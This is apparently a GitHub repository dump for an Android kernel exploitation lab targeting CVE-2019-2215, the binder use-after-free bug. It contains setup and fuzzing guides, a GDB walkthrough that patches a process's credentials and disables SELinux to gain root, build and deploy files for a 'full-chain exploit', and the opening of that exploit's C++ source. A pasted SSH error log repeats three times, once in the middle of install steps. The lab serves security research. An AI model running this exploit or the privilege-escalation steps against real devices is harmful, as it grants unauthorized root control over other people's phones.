Project Path: arc_0xbinder_android-kernel-exploitation-lab_7_fsh1fn

Source Tree:

```txt
arc_0xbinder_android-kernel-exploitation-lab_7_fsh1fn
├── LICENSE
├── README.md
├── custom-manifest
│   └── goldfish-android10-manifest.xml
├── documentation
│   ├── environment_setup.md
│   ├── fuzzing_with_afl++.md
│   ├── fuzzing_with_syzkaller.md
│   └── kernel_privesc_with_gdb_scripts.md
├── exploit-code
│   ├── CMakeLists.txt
│   ├── Makefile
│   ├── binder_cve_2019_2215_exploit.cpp
│   ├── binder_cve_2019_2215_exploit.h
│   ├── binder_cve_2019_2215_poc.c
│   └── common.h
├── fuzzer
│   ├── binder_fuzzer.c
│   └── fuzzer_wrapper.sh
├── gdb-scripts
│   ├── binder_debug.py
│   └── kernel_privesc.py
├── kernel-build-configs
│   ├── x86_64_kasan_build.sh
│   └── x86_64_kasan_debug_build.sh
└── patches
    └── android-binder-cve-2019-2215-patch.patch

```

`LICENSE`:

```
MIT License

Copyright (c) 2025 0xbinder

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Android Kernel Exploitation Lab

This lab guides you through setting up an environment to explore CVE-2019-2215, a critical Android kernel vulnerability in the binder subsystem.

## Documentation

- [Environment Setup](documentation/environment_setup.md)
- [Kernel privesc with gdb script](documentation/kernel_privesc_with_gdb_scripts.md)
- [Fuzzing with syzkaller](documentation/fuzzing_with_syzkaller.md)
- [Fuzzing with AFL++](documentation/fuzzing_with_afl++.md)

### Technical Details: CVE-2019-2215

This vulnerability is a use-after-free in the Android binder driver with the following characteristics:

1. **Root Cause**: When a binder fd is added to an epoll instance and then the thread exits, the binder_thread object is freed while still accessible through epoll.

2. **Exploitation Path**:
   - Add a binder file descriptor to an epoll instance
   - Call BINDER_THREAD_EXIT ioctl which frees binder_thread
   - Access the freed binder_thread through epoll
   - This leads to a use-after-free condition exploitable for privilege escalation

3. **Impact**: This vulnerability affects Android 8.x, 9.0, and early versions of 10, potentially allowing local privilege escalation to root.

4. **Further Reading**:
   - [Original report on Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942)
   - [Patch in Android kernel](https://android.googlesource.com/kernel/common/+/b77915bc0d4536a18d3f8d2d5a4d3770658bbc38)

## TODO

This lab is a work in progress. Here are planned improvements:

### Short-term Improvements
- [ ] Fix Syzkaller configuration to properly target Android-specific syscalls
- [ ] Fix this Syzkaller issue
```bash
[    3.030651] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2868278d270, max_idle_ns: 440795290098 ns
[    4.040338] clocksource: Switched to clocksource tsc
2025/03/24 21:04:23 running ssh: []string{"-p", "13199", "-F", "/dev/null", "-o", "UserKnownHostsFile=/dev/null", "-o", "IdentitiesOnly=yes", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-i", "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa", "-v", "root@localhost", "pwd"}
2025/03/24 21:04:33 ssh failed: failed to run ["ssh" "-p" "13199" "-F" "/dev/null" "-o" "UserKnownHostsFile=/dev/null" "-o" "IdentitiesOnly=yes" "-o" "BatchMode=yes" "-o" "StrictHostKeyChecking=no" "-o" "ConnectTimeout=10" "-i" "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa" "-v" "root@localhost" "pwd"]: exit status 255
OpenSSH_9.9p2, OpenSSL 3.4.1 11 Feb 2025
debug1: Reading configuration data /dev/null
debug1: Connecting to localhost [::1] port 13199.
debug1: connect to address ::1 port 13199: Connection refused
debug1: Connecting to localhost [127.0.0.1] port 13199.
debug1: fd 3 clearing O_NONBLOCK
debug1: Connection established.
debug1: identity file /home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa type 0
debug1: identity file /home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_9.9
Connection timed out during banner exchange
Connection to 127.0.0.1 port 13199 timed out
```
- [ ] Add detailed instructions for analyzing crash reports
- [ ] Include a simple exploit template for CVE-2019-2215
- [ ] Document proper kernel config settings for QEMU VM boot compatibility

### Future Enhancements
- [ ] Add support for other Android kernel vulnerabilities
- [ ] Create a Docker container for easier setup
- [ ] Add more comprehensive debugging guides with GDB examples
- [ ] Implement a step-by-step guide for developing a full privilege escalation exploit
- [ ] Support for ARM64 architecture in addition to x86_64

### Known Issues

```bash
[    3.030651] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2868278d270, max_idle_ns: 440795290098 ns
[    4.040338] clocksource: Switched to clocksource tsc
2025/03/24 21:04:23 running ssh: []string{"-p", "13199", "-F", "/dev/null", "-o", "UserKnownHostsFile=/dev/null", "-o", "IdentitiesOnly=yes", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-i", "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa", "-v", "root@localhost", "pwd"}
2025/03/24 21:04:33 ssh failed: failed to run ["ssh" "-p" "13199" "-F" "/dev/null" "-o" "UserKnownHostsFile=/dev/null" "-o" "IdentitiesOnly=yes" "-o" "BatchMode=yes" "-o" "StrictHostKeyChecking=no" "-o" "ConnectTimeout=10" "-i" "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa" "-v" "root@localhost" "pwd"]: exit status 255
OpenSSH_9.9p2, OpenSSL 3.4.1 11 Feb 2025
debug1: Reading configuration data /dev/null
debug1: Connecting to localhost [::1] port 13199.
debug1: connect to address ::1 port 13199: Connection refused
debug1: Connecting to localhost [127.0.0.1] port 13199.
debug1: fd 3 clearing O_NONBLOCK
debug1: Connection established.
debug1: identity file /home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa type 0
debug1: identity file /home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_9.9
Connection timed out during banner exchange
Connection to 127.0.0.1 port 13199 timed out
```

### Community Contributions
If you're interested in contributing to this project, please consider addressing any of the items above or submit your own ideas through a pull request.

#### Help
particularly looking for help with:
1. Fixing the known issues
2. Improving QEMU configuration for better compatibility with the Android kernel
3. Creating a reliable fuzzing setup that works across different Linux distributions

If you have expertise in these areas, your contributions would be greatly appreciated!
```

`custom-manifest/goldfish-android10-manifest.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<manifest>
    <!-- Remote repository configuration -->
    <remote name="aosp"
        fetch=".."
        review="https://android-review.googlesource.com/" />

    <!-- Default settings applied to all projects -->
    <default revision="master"
        remote="aosp"
        sync-j="4" />

    <!-- Core projects -->
    <project path="build"
        name="kernel/build"
        revision="android10-release" />

    <project path="goldfish"
        name="kernel/goldfish"
        revision="182a76ba7053af521e4c0d5fd62134f1e323191d" />

    <project path="kernel/tests"
        name="kernel/tests"
        revision="android10-release" />

    <!-- Toolchain projects -->
    <project path="prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9"
        name="platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9"
        clone-depth="1"
        revision="android10-release" />

    <project path="prebuilts/gcc/linux-x86/x86/x86_64-linux-android-4.9"
        name="platform/prebuilts/gcc/linux-x86/x86/x86_64-linux-android-4.9"
        clone-depth="1"
        revision="android10-release" />

    <project path="prebuilts-master/clang/host/linux-x86"
        name="platform/prebuilts/clang/host/linux-x86"
        clone-depth="1"
        revision="android10-release" />
</manifest>
```

`documentation/environment_setup.md`:

```md
## Environment Setup

### Prerequisites

Before starting, ensure you have the necessary tools installed on your system:
- Git
- Android repo tool
- Build essentials
- Android studio

### Clone Repository
```bash
git clone https://github.com/0xbinder/android-kernel-exploitation-lab.git ~/android-kernel-exploitation-lab
cd ~/android-kernel-exploitation-lab
```

### Kernel Build Environment Setup

1. Create a directory for the kernel source:
```bash
mkdir -p android-kernel
cd android-kernel
```

2. Initialize the repository:
```bash
repo init --depth=1 -u https://android.googlesource.com/kernel/manifest -b q-goldfish-android-goldfish-4.14-dev
```

3. Replace the default manifest:
```bash
cp ~/android-kernel-exploitation-lab/custom-manifest/goldfish-android10-manifest.xml .repo/manifests/default.xml
```

4. Sync the kernel source:
```bash
repo sync -c --no-tags --no-clone-bundle -j$(nproc)
```

5. Patch the vulnerability:
```bash
cd goldfish/
git apply ~/android-kernel-exploitation-lab/patches/android-binder-cve-2019-2215-patch.patch
git status
```

6. Build the kernel:
```bash
android-kernel-exploitation-lab/android-kernel on  main [!?] 
❯ BUILD_CONFIG=../kernel-build-configs/x86_64_kasan_build.sh build/build.sh
```

Troubleshooting Common Errors
If you encounter the following linker error during compilation:

```bash
/sbin/ld: scripts/dtc/dtc-parser.tab.o:(.bss+0x10): multiple definition of `yylloc'; scripts/dtc/dtc-lexer.lex.o:(.bss+0x0): first defined here
```

This occurs due to a variable declaration conflict in the Device Tree Compiler source files. Fix it with:

```bash
sed -i 's/YYLTYPE yylloc;/extern YYLTYPE yylloc;/' ~/android-kernel-exploitation-lab/android-kernel/goldfish/scripts/dtc/dtc-lexer.lex.c_shipped
```

This command modifies the lexer source file to declare `yylloc` as an external variable, resolving the multiple definition error.
After applying the fix, rerun the build command to continue the kernel compilation process.

### Launch the Emulator with Custom Kernel
Before launching the emulator, ensure your environment is properly configured:

Set up Android SDK environment variables:

```bash
# Add these lines to your ~/.bashrc or ~/.zshrc
export ANDROID_SDK_ROOT=$HOME/Android/Sdk   # Change this path as needed
export PATH=$PATH:$ANDROID_SDK_ROOT/emulator
export PATH=$PATH:$ANDROID_SDK_ROOT/platform-tools
export PATH=$PATH:$ANDROID_SDK_ROOT/cmdline-tools/latest/bin
```

Then reload your shell configuration:

```bash
source ~/.bashrc  # or source ~/.zshrc
```

#### Create an appropriate AVD:
Verify your available system images first:

```bash
sdkmanager --list | grep system-images
```

Install the required system image if not already present:

```bash
sdkmanager "system-images;android-29;google_apis_playstore;x86_64"
```

Create an AVD specifically for testing the kernel vulnerability:

```bash
avdmanager create avd \
  --name "CVE-2019-2215" \
  --package "system-images;android-29;google_apis_playstore;x86_64" \
  --device "pixel"
```

Verify your AVD was created:

```bash
avdmanager list avd
```

Start the emulator using your custom-built kernel:

```bash
emulator -show-kernel -no-snapshot -wipe-data -avd CVE-2019-2215 -kernel ~/android-kernel-exploitation-lab/android-kernel/out/kasan/dist/bzImage
```

This command:

 - Shows kernel logs in the terminal (-show-kernel)
 - Starts with a clean state (-no-snapshot -wipe-data)
 - Uses your custom kernel with KASAN debugging enabled
```

`documentation/fuzzing_with_afl++.md`:

```md
## Fuzzing with AFL++ to Target CVE-2019-2215

AFL++ is a powerful fuzzing tool that can be used as an alternative or complement to Syzkaller for targeting specific kernel subsystems like the binder.

### 1. Install AFL++

#### For Debian/Ubuntu-based distributions:
```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools
git clone https://github.com/AFLplusplus/AFLplusplus.git
cd AFLplusplus
make all
sudo make install
```

#### For Fedora/RHEL/CentOS:
```bash
sudo dnf install -y gcc gcc-c++ git clang python3-devel glib2-devel pixman-devel
git clone https://github.com/AFLplusplus/AFLplusplus.git
cd AFLplusplus
make all
sudo make install
```

#### For Arch Linux:
```bash
sudo pacman -S gcc make git clang python glib2 pixman
git clone https://github.com/AFLplusplus/AFLplusplus.git
cd AFLplusplus
make all
sudo make install
```

#### For openSUSE:
```bash
sudo zypper install -y gcc gcc-c++ git clang python3-devel glib2-devel libpixman-1-0-devel
git clone https://github.com/AFLplusplus/AFLplusplus.git
cd AFLplusplus
make all
sudo make install
```

### 2. Compile the Harness with AFL++ Instrumentation

```bash
cd ~/android-kernel-exploitation-lab/fuzzer
afl-clang-fast -o binder_fuzzer binder_fuzzer.c
```

### 3. Create Initial Input Corpus

```bash
mkdir -p ~/android-kernel-exploitation-lab/afl_input
cd ~/android-kernel-exploitation-lab/

# Create a simple seed file
echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" > afl_input/seed1

# Create a more targeted seed file for binder operations
cat > afl_input/seed2 << EOF
\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00
EOF
```

### 4. Start the emulator with your custom kernel:

```bash
emulator -avd CVE-2019-2215 -kernel ~/android-kernel-exploitation-lab/android-kernel/out/kasan/dist/bzImage -no-snapshot -show-kernel
```

### 5. Push the fuzzer to the device:

```bash
adb push binder_fuzzer /data/local/tmp/
adb shell chmod 755 /data/local/tmp/binder_fuzzer
```

### 6. Run AFL++ with the wrapper

```bash
afl-fuzz -i afl_input -o afl_output -n -- fuzzer/fuzzer_wrapper.sh @@
```
```

`documentation/fuzzing_with_syzkaller.md`:

```md
## Fuzzing with Syzkaller to Reproduce CVE-2019-2215

Follow these steps to set up and run syzkaller for finding and reproducing this kernel vulnerability.

### 1. Install Dependencies

#### For Debian/Ubuntu-based distributions:
```bash
# System packages
sudo apt-get update
sudo apt-get install -y gcc git make golang-go g++ pkg-config libunwind-dev liblzma-dev
```
[    3.030651] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2868278d270, max_idle_ns: 440795290098 ns
[    4.040338] clocksource: Switched to clocksource tsc
2025/03/24 21:04:23 running ssh: []string{"-p", "13199", "-F", "/dev/null", "-o", "UserKnownHostsFile=/dev/null", "-o", "IdentitiesOnly=yes", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10", "-i", "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa", "-v", "root@localhost", "pwd"}
2025/03/24 21:04:33 ssh failed: failed to run ["ssh" "-p" "13199" "-F" "/dev/null" "-o" "UserKnownHostsFile=/dev/null" "-o" "IdentitiesOnly=yes" "-o" "BatchMode=yes" "-o" "StrictHostKeyChecking=no" "-o" "ConnectTimeout=10" "-i" "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa" "-v" "root@localhost" "pwd"]: exit status 255
OpenSSH_9.9p2, OpenSSL 3.4.1 11 Feb 2025
debug1: Reading configuration data /dev/null
debug1: Connecting to localhost [::1] port 13199.
debug1: connect to address ::1 port 13199: Connection refused
debug1: Connecting to localhost [127.0.0.1] port 13199.
debug1: fd 3 clearing O_NONBLOCK
debug1: Connection established.
debug1: identity file /home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa type 0
debug1: identity file /home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_9.9
Connection timed out during banner exchange
Connection to 127.0.0.1 port 13199 timed out
#### For Fedora/RHEL/CentOS:
```bash
# System packages
sudo dnf update
sudo dnf install -y gcc git make golang g++ pkgconfig libunwind-devel xz-devel
```

#### For Arch Linux:
```bash
# System packages
sudo pacman -Syu
sudo pacman -S gcc git make go gcc pkgconf libunwind xz
```

#### For openSUSE:
```bash
# System packages
sudo zypper refresh
sudo zypper install -y gcc git make go gcc pkgconfig libunwind-devel xz-devel
```

#### Go environment setup (for all distributions):
```bash
wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

### 2. Build Syzkaller

```bash
cd ~/android-kernel-exploitation-lab
git clone --depth=1 https://github.com/google/syzkaller.git
cd syzkaller
make
```

### 3. Create VM Disk Image

#### For Debian/Ubuntu-based distributions:
```bash
# Install QEMU and image creation tools
sudo apt-get install -y qemu-system-x86 qemu-utils debootstrap
```

#### For Fedora/RHEL/CentOS:
```bash
# Install QEMU and image creation tools
sudo dnf install -y qemu-kvm qemu-img debootstrap
```

#### For Arch Linux:
```bash
# Install QEMU and image creation tools
sudo pacman -S qemu qemu-img debootstrap
```

#### For openSUSE:
```bash
# Install QEMU and image creation tools
sudo zypper install -y qemu-kvm qemu-tools debootstrap
```

#### Generate disk image (for all distributions):
```bash
wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh
chmod +x create-image.sh
./create-image.sh
```

### 4. Configure Syzkaller


```bash
nano ~/android-kernel-exploitation-lab/syzkaller_config.cfg 
```

```json
{
    "target": "linux/amd64",
    "http": "127.0.0.1:56741",
    "workdir": "/home/0xbinder/syzkaller_workdir",
    "kernel_obj": "/home/0xbinder/android-kernel-exploitation-lab/android-kernel/out/kasan/",
    "kernel_src": "/home/0xbinder/android-kernel-exploitation-lab/android-kernel/goldfish",
    "image": "/home/0xbinder/android-kernel-exploitation-lab/bullseye.img",
    "sshkey": "/home/0xbinder/android-kernel-exploitation-lab/bullseye.id_rsa",
    "syzkaller": "/home/0xbinder/android-kernel-exploitation-lab/syzkaller",
    "procs": 4,
    "type": "qemu",
    "vm": {
        "count": 1,
        "kernel": "/home/0xbinder/android-kernel-exploitation-lab/android-kernel/out/kasan/dist/bzImage",
        "cpu": 2,
        "mem": 2048,
        "qemu": "qemu-system-x86_64",
        "qemu_args": "-enable-kvm -drive file=/home/0xbinder/android-kernel-exploitation-lab/bullseye.img,format=raw,if=virtio",
        "cmdline": "root=/dev/sda console=ttyS0 earlyprintk=serial rootfstype=ext4 rootwait rw init=/bin/bash"
    },
    "reproduce": true,
    "sandbox": "namespace"
}
```

### 5. Run Syzkaller

Start the fuzzing process to automatically discover the vulnerability:

```bash
syzkaller/bin/syz-manager -config=/home/0xbinder/android-kernel-exploitation-lab/syzkaller_config.cfg
```

you can use debug mode

```bash
syzkaller/bin/syz-manager -config=/home/0xbinder/android-kernel-exploitation-lab/syzkaller_config.cfg -debug
```

### 6. Analyzing Crashes

When syzkaller finds crashes:

1. Access the web interface at http://127.0.0.1:56741
2. Look for crashes related to the binder subsystem, particularly:
   - Use-after-free errors in binder.c
   - KASAN reports mentioning binder_thread or binder_transaction
   - Crashes after interactions between epoll and binder operations
3. Extract the C reproducer from the crash details
4. Compile and test the reproducer against your vulnerable kernel
```

`documentation/kernel_privesc_with_gdb_scripts.md`:

```md
# Kernel Privesc with GDB Scripts

## 1. Kernel Build Configuration
```bash
android-kernel-exploitation-lab/android-kernel on  main [!?] 
❯ BUILD_CONFIG=../kernel-build-configs/x86_64_kasan_debug_build.sh build/build.sh
```
- **Purpose**: Build the Android kernel with debugging configurations
- **Key Points**:
  - Uses a predefined build configuration for x86_64 KASAN (Kernel Address Sanitizer) debug build
  - Prepares the kernel with instrumentation for security analysis and debugging

## 2. Emulator Launch with Kernel Debugging
```bash
emulator -show-kernel -no-snapshot -wipe-data -avd CVE-2019-2215 -kernel ~/android-kernel-exploitation-lab/android-kernel/out/relwithdebinfo/dist/bzImage -qemu -s -S
```
- **Emulator Configuration**:
  - `-show-kernel`: Display kernel log messages
  - `-no-snapshot`: Prevent saving/restoring emulator state
  - `-wipe-data`: Clear all user data
  - `-avd CVE-2019-2215`: Use a specific Android Virtual Device
  - `-kernel`: Specify custom kernel image
  - `-qemu -s -S`: 
    - `-s`: Enable GDB server on TCP port 1234
    - `-S`: Pause execution at startup, waiting for debugger

## 3. GDB Kernel Debugging Connection
```bash
gdb -quiet ~/android-kernel-exploitation-lab/android-kernel/out/relwithdebinfo/dist/vmlinux -ex 'target remote :1234'
```
- **Debugging Setup**:
  - Load the kernel debug symbol file (vmlinux)
  - Connect to the remote debugging server on localhost:1234
  - Prepare for kernel-level debugging and analysis

## 4. Process Identification
```bash
❯ adb shell
generic_x86_64:/ $ pidof sh
6998
generic_x86_64:/ $
```
- **Objective**: Identify the process ID of the shell
- **Used for**: Targeting specific process for privilege escalation

## 5. Kernel Privilege Escalation Script
```bash
(remote) gef➤ source ~/android-kernel-exploitation-lab/gdb-scripts/kernel_privesc.py
```
- **Script Functionality**:
  - Load custom GDB scripts for kernel exploitation
  - Provides utilities like:
    - `task-list`: List kernel tasks
    - `task-by-pid`: Find task structure by PID
    - `root-by-pid`: Elevate privileges for a process

## 6. Privilege Escalation Execution
```bash
(remote) gef➤ root-by-pid 6998
```
- **Exploitation Process**:
  - Target a specific process (PID 6998)
  - Patch process credentials
  - Disable SELinux enforcement
  - Gain root privileges

## 7. Verification of Root Access
```bash
❯ adb shell
generic_x86_64:/ $ pidof sh
6998
generic_x86_64:/ $ id
uid=0(root) gid=0(root) groups=0(root),...
```
- **Confirmation**:
  - Verify successful privilege escalation
  - User ID and Group ID changed to root
  - Multiple root-level group memberships acquired
```

`exploit-code/CMakeLists.txt`:

```txt
#
# CMakeLists.txt - Build configuration for CVE-2019-2215 exploit
#

cmake_minimum_required(VERSION 3.12)

# Display project banner
message(STATUS "
╔═══════════════════════════════════════════════════════════╗
║  CVE-2019-2215: Android Binder Use-After-Free Exploit     ║
╚═══════════════════════════════════════════════════════════╝
")

#
# Environment and path configuration
#
set(NDK_ROOT $ENV{HOME}/Android/Sdk/ndk/21.0.6113669)
set(ADB_PATH $ENV{HOME}/Android/Sdk/platform-tools/adb)

# Check for NDK environment
if(NOT DEFINED NDK_ROOT)
    if(DEFINED $ENV{NDK_ROOT})
        set(NDK_ROOT "$ENV{NDK_ROOT}")
    else()
        message(FATAL_ERROR "NDK_ROOT not found! Please define NDK_ROOT to point to your Android NDK installation.")
    endif()
endif()

# Set up Android build environment
set(CMAKE_TOOLCHAIN_FILE ${NDK_ROOT}/build/cmake/android.toolchain.cmake)
set(ANDROID_ABI x86_64)
set(ANDROID_PLATFORM latest)

# Define project
project(android_binder_exploit VERSION 1.0 LANGUAGES CXX)

# Add build targets
add_executable(binder_uaf_trigger trigger.cpp)
add_executable(binder_uaf_exploit exploit.cpp)

# Configure compiler options
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Add compiler warnings
if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang")
    add_compile_options(-Wall -Wextra -Wpedantic)
endif()

# Deploy to device after building
add_custom_command(
    TARGET binder_uaf_trigger
    POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Deploying trigger to device..."
    COMMAND ${ADB_PATH} push binder_uaf_trigger /data/local/tmp > /dev/null
    COMMENT "Pushing binder_uaf_trigger to device"
    VERBATIM
)

add_custom_command(
    TARGET binder_uaf_exploit
    POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Deploying exploit to device..."
    COMMAND ${ADB_PATH} push binder_uaf_exploit /data/local/tmp > /dev/null
    COMMENT "Pushing binder_uaf_exploit to device"
    VERBATIM
)

# Add verification step
add_custom_command(
    TARGET binder_uaf_exploit
    POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Setting permissions..."
    COMMAND ${ADB_PATH} shell "chmod 755 /data/local/tmp/binder_uaf_trigger /data/local/tmp/binder_uaf_exploit" > /dev/null
    COMMENT "Setting executable permissions"
    VERBATIM
)

message(STATUS "Build configuration complete. Run 'make' to build.")
```

`exploit-code/Makefile`:

```
#
# Makefile for Android Binder Use-After-Free Exploit (CVE-2019-2215)
#
# Usage:
#   NDK_ROOT=/path/to/ndk make
#   make push
#   make clean
#

# ===================== Build Configuration =====================

# Compiler settings
CXX             := clang++
CXXFLAGS        := -static -O3 -Wall -Wextra -Wpedantic

# Android platform settings
ARCH            := x86_64
NDK_API         ?= 29
CROSS_COMPILE   := $(NDK_ROOT)/toolchains/llvm/prebuilt/linux-x86_64
TARGET_PLATFORM := $(ARCH)-linux-android
CXX_PATH        := $(CROSS_COMPILE)/bin/$(TARGET_PLATFORM)$(NDK_API)-$(CXX)

# Source and output files
TRIGGER_SRC     := binder_cve_2019_2215_poc.c
EXPLOIT_SRC     := binder_cve_2019_2215_exploit.cpp
COMMON_HDR      := common.h binder_cve_2019_2215_exploit.h
TRIGGER_OUTPUT  := binder_uaf_trigger
EXPLOIT_OUTPUT  := binder_uaf_exploit

# ADB settings
ADB             := adb
ADB_DEST        := /data/local/tmp

# ===================== Build Rules =====================

# Default rule
all: banner check-ndk build

# Display banner
banner:
	@echo "╔═══════════════════════════════════════════════════════════╗"
	@echo "║  CVE-2019-2215: Android Binder Use-After-Free Exploit     ║"
	@echo "╚═══════════════════════════════════════════════════════════╝"
	@echo

# Check NDK environment
check-ndk:
	@if [ -z "$(NDK_ROOT)" ]; then \
		echo "Error: NDK_ROOT environment variable not set"; \
		echo "Usage: NDK_ROOT=/path/to/ndk make"; \
		exit 1; \
	fi
	@if [ ! -d "$(NDK_ROOT)" ]; then \
		echo "Error: NDK directory not found: $(NDK_ROOT)"; \
		exit 1; \
	fi
	@echo "[+] Using Android NDK at: $(NDK_ROOT)"

# Build both executables
build: build-trigger build-exploit

# Build trigger executable
build-trigger: $(TRIGGER_SRC) $(COMMON_HDR)
	@echo "[+] Building: $(TRIGGER_OUTPUT)"
	@$(CXX_PATH) $(CXXFLAGS) -o $(TRIGGER_OUTPUT) $(TRIGGER_SRC)
	@echo "[+] Build complete: $(TRIGGER_OUTPUT)"

# Build exploit executable
build-exploit: $(EXPLOIT_SRC) $(COMMON_HDR)
	@echo "[+] Building: $(EXPLOIT_OUTPUT)"
	@$(CXX_PATH) $(CXXFLAGS) -o $(EXPLOIT_OUTPUT) $(EXPLOIT_SRC)
	@echo "[+] Build complete: $(EXPLOIT_OUTPUT)"

# Push both executables to device
push: push-trigger push-exploit set-permissions

# Push trigger to device
push-trigger: build-trigger
	@echo "[+] Pushing: $(TRIGGER_OUTPUT) to $(ADB_DEST)"
	@$(ADB) push $(TRIGGER_OUTPUT) $(ADB_DEST)

# Push exploit to device
push-exploit: build-exploit
	@echo "[+] Pushing: $(EXPLOIT_OUTPUT) to $(ADB_DEST)"
	@$(ADB) push $(EXPLOIT_OUTPUT) $(ADB_DEST)

# Set executable permissions
set-permissions:
	@echo "[+] Setting executable permissions"
	@$(ADB) shell "chmod 755 $(ADB_DEST)/$(TRIGGER_OUTPUT) $(ADB_DEST)/$(EXPLOIT_OUTPUT)"

# Clean build artifacts
clean:
	@echo "[+] Cleaning build artifacts"
	@rm -f $(TRIGGER_OUTPUT) $(EXPLOIT_OUTPUT)
	@echo "[+] Clean complete"

# Run exploit on device
run-exploit: push
	@echo "[+] Running exploit on device"
	@$(ADB) shell "$(ADB_DEST)/$(EXPLOIT_OUTPUT)"

# Phony rules
.PHONY: all banner check-ndk build build-trigger build-exploit \
        push push-trigger push-exploit set-permissions clean run-exploit
```

`exploit-code/binder_cve_2019_2215_exploit.cpp`:

```cpp
/*
 * A full-chain exploit for the Android Binder UAF vulnerability
 * 
 * References:
 * - https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 * - https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html
 * - https://groups.google.com/d/msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ
 *
 * Credits:
 * - Maddie Stone (@maddiestone) - Project Zero
 * - Jann Horn (@tehjh) - Project Zero
 */

#include "binder_cve_2019_2215_exploit.h"

//======================================================
// CPU & MEMORY MANAGEMENT
//======================================================

/**
 * Bind process to a specific CPU core to maintain consistent SLUB state
 */
void BinderUaF::bindToCPU() {
    int ret;
    cpu_set_t cpuSet;

    CPU_ZERO(&cpuSet);
    CPU_SET(0, &cpuSet);

    INFO("[+] Binding to 0th core\n");

    ret = sched_setaffinity(0, sizeof(cpu_set_t), &cpuSet);

    if (ret < 0) {
        ERR("[-] bindCPU failed: 0x%x\n", errno);
    }
}

/**
 * Allocate a 4GB aligned page for exploitation
 */
void BinderUaF::mmap4gbAlignedPage() {
    if (!m_4gb_aligned_page) {
        INFO("[+] Mapping 4GB aligned page\n");

        m_4gb_aligned_page = mmap(
                (void *) 0x100000000ul,
                PAGE_SIZE,
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS,
                -1,
                0
        );

        if (!m_4gb_aligned_page) {
            ERR("\t[-] Unable to mmap 4GB aligned page\n");
            exit(EXIT_FAILURE);
        } else {
            INFO("\t[*] Mapped page: %p\n", m_4gb_aligned_page);
        }
    }
}

//======================================================
// DEVICE SETUP & INITIALIZATION
//======================================================

/**
 * Open the binder device
 */
void BinderUaF::setupBinder() {
    INFO("[+] Opening: /dev/binder\n");

    m_binder_fd = open("/dev/binder", O_RDONLY);

    if (m_binder_fd < 0) {
        ERR("\t[-] Unable to get binder fd\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] m_binder_fd: 0x%x\n", m_binder_fd);
    }
}

/**
 * Create an epoll instance for binder wait queue manipulation
 */
void BinderUaF::setupEventPoll() {
    INFO("[+] Creating event poll\n");

    m_epoll_fd = epoll_create(1);

    if (m_epoll_fd < 0) {
        ERR("\t[-] Unable to get event poll fd\n");
        exit(EXIT_FAILURE);
    } else {
        INFO("\t[*] m_epoll_fd: 0x%x\n", m_epoll_fd);
    }
}

/**
 * Initialize a pipe for kernel read/write operations
 */
